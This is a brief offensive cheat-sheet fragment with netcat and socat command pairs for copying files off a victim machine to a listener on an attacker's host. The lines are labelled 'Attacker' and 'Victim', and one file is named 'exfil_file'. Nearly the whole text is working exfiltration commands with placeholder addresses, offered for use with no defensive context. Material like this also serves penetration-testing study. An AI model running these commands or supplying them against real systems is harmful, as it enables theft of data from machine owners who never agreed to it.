
##### Netcat
After sending a static copy to host:
```
nc -lvnp 6666 > new_file
nc -vn IP 6666 < exfil_file
```

##### Socat
After sending a static copy to host:
```
socat -u tcp-listen:6666,reuseaddr open:FILE,creat  // Attacker
socat -u file:FILE tcp-connect:IP:PORT              // Victim
```